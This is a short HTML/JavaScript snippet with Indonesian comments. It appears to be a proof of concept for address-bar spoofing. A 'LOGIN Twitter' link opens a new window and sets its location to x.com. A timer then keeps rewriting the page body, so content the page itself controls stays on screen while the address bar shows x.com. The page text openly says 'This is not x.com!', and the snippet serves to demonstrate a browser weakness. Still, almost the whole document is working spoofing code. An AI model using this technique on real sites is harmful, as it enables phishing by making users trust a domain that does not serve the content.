<script>
  function next() {
    // Redirect ke halaman Google setelah pengalihan
    w.location.replace('https://www.google.com:1234');
  }

  function f() {
    // Membuka jendela baru
    w = window.open("");  
    w.document.write('<h2>This is not x.com!</h2>');  // Tampilkan konten sementara

    // Mengubah alamat URL ke x.com, address bar berubah
    w.location = "https://x.com";

    // Menambahkan efek loading bolak-balik di dalam konten
    let counter = 0;
    let loadingInterval = setInterval(function() {
      counter++;
      if (counter % 2 === 0) {
        w.document.body.innerHTML = "<h2>This is not x.com!</h2>";  // Tampilkan konten asli
      } else {
        w.document.body.innerHTML = "<h2>Loading...</h2>";  // Efek loading bolak-balik
      }
    }, 500);  // Interval bolak-balik setiap 500ms

    // Hentikan interval setelah beberapa detik dan pastikan konten tetap di x.com
    setTimeout(function() {
      clearInterval(loadingInterval);  // Berhenti bolak-balik setelah 5 detik
      w.document.body.innerHTML = "<h2>This is not x.com!</h2>";  // Tampilkan kembali konten asli
    }, 5000);  // Berhenti setelah 5 detik
  }
</script>

<a href="#" onclick="f()">LOGIN Twitter</a>
